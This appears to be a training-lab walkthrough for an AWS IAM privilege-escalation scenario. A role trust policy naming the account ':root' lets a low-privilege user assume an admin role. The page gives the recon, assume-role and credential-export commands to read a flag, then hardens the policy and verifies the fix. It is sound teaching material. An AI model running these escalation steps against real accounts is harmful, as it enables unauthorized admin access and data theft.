## Scenario 2: Trust Policy `:root` — Privilege Escalation via Permissive Role Trust

**Category:** Principal Access
**Starting Identity:** `iamws-role-assumer-user`
**Target:** Crown jewels via assuming `iamws-privileged-admin-role`

**The Vulnerability:** `iamws-privileged-admin-role` has a trust policy that specifies `arn:aws:iam::ACCOUNT_ID:root` as the trusted principal. Despite looking like it restricts access to the root user, `:root` in a trust policy means any principal in the account with `sts:AssumeRole` permission can assume this role.

**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking it restricts the role to a single privileged user. In practice, this grants every IAM user and role in the account the ability to become an administrator — the blast radius of a single compromised identity expands to full account takeover.

### Part A: Identify with iam-recon

First, build or refresh your iam-recon graph:

```bash
iam-recon graph create --profile taractf
```

Run the privilege escalation preset to surface suspicious STS edges:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc
```

Expected output (relevant excerpt):
```
──────────────────────────────
  Privilege Escalation Paths
──────────────────────────────

  >>> user/iamws-role-assumer-user can escalate to admin:
    user/iamws-role-assumer-user -> STS role/iamws-privileged-admin-role
```

The `STS` edge flags that `iamws-role-assumer-user` can reach the admin-tier `iamws-privileged-admin-role` via `sts:AssumeRole`.

Confirm the specific action directly:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-role-assumer-user \
  --action sts:AssumeRole \
  --resource 'arn:aws:iam::*:role/iamws-privileged-admin-role'
```

Expected output:
```
ALLOW user/iamws-role-assumer-user can call sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role
```

Cross-reference with pathfinding.cloud's known path database:

```bash
iam-recon --account $ACCOUNT_ID pathfinding
```

Look for the `[sts-001]` entry:
```
[sts-001] user/iamws-role-assumer-user (principal-access)
    Path: sts:AssumeRole
    Perms: sts:AssumeRole
    https://www.pathfinding.cloud/paths/sts-001
```

**In the interactive visualization:** launch `iam-recon --account $ACCOUNT_ID visualize --interactive-viz` (the port is dynamic — watch for `Interactive visualization available at: http://127.0.0.1:<port>` in the terminal). Search for `role-assumer-user`. You'll see an orange node with an **STS** edge leading to the red admin role. Click the STS edge — iam-recon displays the trust policy inline, showing `:root` as the trusted principal.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/sts-001](https://pathfinding.cloud/paths/sts-001):

- **Category:** Principal Access
- **Required permission:** `sts:AssumeRole` on the caller's identity policy **plus** a permissive trust policy on the target role
- **Root cause:** Trust policy specifies `:root` instead of specific principals
- **Impact:** Any principal in the account can assume an admin-tier role

> [!NOTE]
> The vulnerability is **not** in the attacker's `sts:AssumeRole` permission — it's in the **target role's trust policy**. Trust policies are resource policies attached to the role itself. They control who can assume the role, independent of what the caller's identity policy allows.

### Part C: Exploit the Vulnerability

**Step 1: Confirm your low-privilege identity**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-role-assumer-user)
aws sts get-caller-identity --profile iamws-role-assumer-user
```

Expected output:
```json
{
    "UserId": "AIDAXXXXXXXXXXXXXXXXX",
    "Account": "767397689800",
    "Arn": "arn:aws:iam::767397689800:user/iamws-role-assumer-user"
}
```

You're operating as a low-privilege user with no direct access to sensitive resources.

**Step 2: Inspect the vulnerable trust policy**

```bash
aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json \
  --profile iamws-role-assumer-user
```

Expected output:
```json
{
    "Version": "2012-10-17",
    "Statement": [{
        "Effect": "Allow",
        "Principal": { "AWS": "arn:aws:iam::767397689800:root" },
        "Action": "sts:AssumeRole"
    }]
}
```

The `:root` principal is the smoking gun — this role trusts the entire account.

**Step 3: Try the crown jewels directly — you're denied**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

The user can't reach the crown jewels directly. Time to use the permissive trust policy.

**Step 4: Assume the privileged admin role**

```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" --output json \
  --profile iamws-role-assumer-user)

export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
```

No error — the permissive trust policy allows any account principal to assume this admin role.

**Step 5: Claim the crown jewels with elevated credentials**

```bash
aws sts get-caller-identity
```

Expected output:
```json
{
    "UserId": "AROAXXXXXXXXXXXXXXXXX:escalated",
    "Account": "767397689800",
    "Arn": "arn:aws:sts::767397689800:assumed-role/iamws-privileged-admin-role/escalated"
}
```

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

The file contents appear — you now hold `AdministratorAccess`.

**Step 6: Clean up the escalated session**

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
aws sts get-caller-identity   # confirm you're back to iamws-role-assumer-user
```

### Part D: Apply the Defense

Run all defense steps as your admin identity (not as `iamws-role-assumer-user`).

**Step 1: Inspect the current vulnerable trust policy**

```bash
aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json
```

You'll see the same `:root` principal you just exploited.

**Step 2: Harden — replace `:root` with a specific principal and add an MFA condition**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
ADMIN_ROLE_ARN=$(aws sts get-caller-identity --query Arn --output text)

aws iam update-assume-role-policy \
  --role-name iamws-privileged-admin-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {"AWS": "'$ADMIN_ROLE_ARN'"},
      "Action": "sts:AssumeRole",
      "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}
    }]
  }'
```

What this changes:
1. **Specific principal:** Only your admin identity can assume the role — eliminates the `:root` vulnerability.
1. **MFA condition:** Requires MFA — sensitive roles should require strong authentication.

> 🚧 **Kiro lab integration point — see Andrew.** A guided Kiro walkthrough for authoring the hardened trust policy slots in here.

### Part E: Verify the Remediation

**Step 1: Re-run the exploit as the attacker — confirm it's blocked**

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --profile iamws-role-assumer-user
```

Expected output:
```
An error occurred (AccessDenied) when calling the AssumeRole operation:
User: arn:aws:iam::767397689800:user/iamws-role-assumer-user
is not authorized to perform: sts:AssumeRole on resource:
arn:aws:iam::767397689800:role/iamws-privileged-admin-role
```

The attack is blocked.

**Step 2: Confirm the crown jewels are still safe**

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-role-assumer-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 3: Verify with iam-recon**

Refresh the graph and re-run the privesc preset:

```bash
iam-recon graph create --profile taractf
iam-recon --account $ACCOUNT_ID argquery --preset privesc
```

The `user/iamws-role-assumer-user -> STS role/iamws-privileged-admin-role` line is gone. The graph drops from 20 edges to 18. `argquery --preset privesc` is the correct verification surface here — its STS edge checker evaluates trust policies.

> [!NOTE]
> Running `argquery --principal user/iamws-role-assumer-user --action sts:AssumeRole --resource <role-arn>` will still return `ALLOW` after the defense. iam-recon's per-action query only checks the caller's identity policy, not the role's trust policy. AWS `simulate-principal-policy` has the same limitation by design. The live `aws sts assume-role` attempt and the disappearance of the STS edge in `argquery --preset privesc` are the two authoritative verifications.

**In the interactive visualization:** search for `privileged-admin-role`. The STS edge between `iamws-role-assumer-user` and `iamws-privileged-admin-role` is gone. Click the role node — the inspect panel shows `iamws-privileged-admin-role-trust` under **TRUST** (clickable). Note: iam-recon's viz flags this trust policy as "1 RISK" even after hardening — this is cosmetic; the absent STS edge is the authoritative signal.

![Post-defense trust panel](.playwright-mcp/scenario-2-postdefense-trust-panel.png)

### What You Learned

- Trust policies that specify `:root` trust every principal in the account — not just the AWS root user.
- The vulnerability is in the **resource policy** (trust policy) attached to the role itself, not in the caller's identity policy.
- Always use **specific principal ARNs** in trust policies; add **condition keys** (like `aws:MultiFactorAuthPresent`) for defense in depth on sensitive roles.
- iam-recon's `argquery --preset privesc` correctly reflects trust-policy changes because its STS edge checker evaluates trust policies. Per-action `argquery --principal` queries check identity policies only — they are not reliable for verifying trust-policy-based defenses.
- `aws:MultiFactorAuthPresent` works for long-term IAM users; federated SSO sessions need different condition keys (e.g., `aws:PrincipalTag/...`).

### Cleanup

See [`cleanup.md`](cleanup.md) for revert steps before moving to the next scenario.

---

**Next:** [Scenario 3: PassRole + EC2](../scenario-3-passrole-ec2/instructions.md) — Privilege escalation via new PassRole to an EC2 instance profile
